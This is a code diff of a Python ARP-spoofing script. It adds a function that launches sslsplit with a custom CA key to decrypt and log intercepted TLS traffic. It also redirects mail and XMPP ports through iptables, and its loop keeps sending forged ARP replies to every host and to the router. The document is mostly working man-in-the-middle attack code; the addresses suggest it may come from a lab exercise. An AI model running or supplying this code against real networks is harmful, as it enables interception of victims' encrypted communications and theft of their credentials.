@@ -98,14 +98,17 @@ def enable_port_forwarding():
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443')
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443')
     os.system('iptables -t nat -A PREROUTING -p tcp --dport 5222 -j REDIRECT --to-ports 8080')
+    
+def sslsplit():
     # os.system('sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080')
     # tmp = "sslsplit -D -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080"
+    os.system("mkdir logdir")
+    os.system("mkdir /tmp/sslsplit")
     proc = subprocess.Popen(
         # ["sslsplit", "-l", "connections.log", "-j", "/tmp/sslsplit/", "-S", "logdir/", "-k", "ca.key", "-c", "ca.crt", "ssl", "0.0.0.0", "8443", "tcp", "0.0.0.0", "8080],
         ["sslsplit -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080"],
         stdout=subprocess.PIPE,
         shell=True)
-
 
 def disable_port_forwarding():
     flag = 0
@@ -162,10 +165,8 @@ if __name__ == "__main__":
     print("nic card: ", nic)
     print("router Ip: %-18s MAC: %s" % (routerIp,routerMac))
     print("host   Ip: %-18s MAC: %s" % (hostip, hostmac))
-    # print("host MAC", hostmac)
 
     print("")
-
 
     print("----------------------------------------------")
     print("IP                       MAC")
@@ -175,27 +176,28 @@ if __name__ == "__main__":
         print("%-18s       %s" % (ip[i],mac[i]))
 
     enable_port_forwarding()
+    sslsplit()
 
     try:
         while(1):
-            # verbose=0 : make the function totally silent
-            # More : help(send)
-            # https://stackoverflow.com/questions/15377150/how-can-i-call-the-send-function-without-getting-output
-
             print(" ")
             for j in range(0,len(ip)):
                 if(ip[j]!="10.0.2.2" and ip[j]!="10.0.2.3"):
                     print("Send to: ",ip[j]," ",mac[j]),
-                    victimpacket = ARP(op=2,
-                                    pdst = ip[j],               # victim's IP
-                                    hwdst= mac[j],              # victim's MAC 
-                                    psrc = routerIp,            # router's IP
-                                    hwsrc=hostmac)  # attacker's MAC
-                    routerpacket = ARP(op=2,
-                                    pdst =  routerIp,
-                                    hwdst= routerMac,
-                                    psrc = ip[j],
-                                    hwsrc=hostmac)
+                    victimpacket = ARP( op      =  2,
+                                        pdst    = ip[j],            # victim's IP
+                                        hwdst   = mac[j],           # victim's MAC 
+                                        psrc    = routerIp,         # router's IP
+                                        hwsrc   =  hostmac)         # attacker's MAC
+                    routerpacket = ARP( op      =   2,
+                                        pdst    =   routerIp,       # router's IP
+                                        hwdst   =   routerMac,      # router's MAC
+                                        psrc    =   ip[j],          # victim's IP
+                                        hwsrc   =   hostmac)        # attacker's MAC
+                                        
+                    # verbose=0 : make the function totally silent
+                    # More : help(send)
+                    # https://stackoverflow.com/questions/15377150/how-can-i-call-the-send-function-without-getting-output
                     send(victimpacket, verbose=0)
                     send(routerpacket, verbose=0)
 
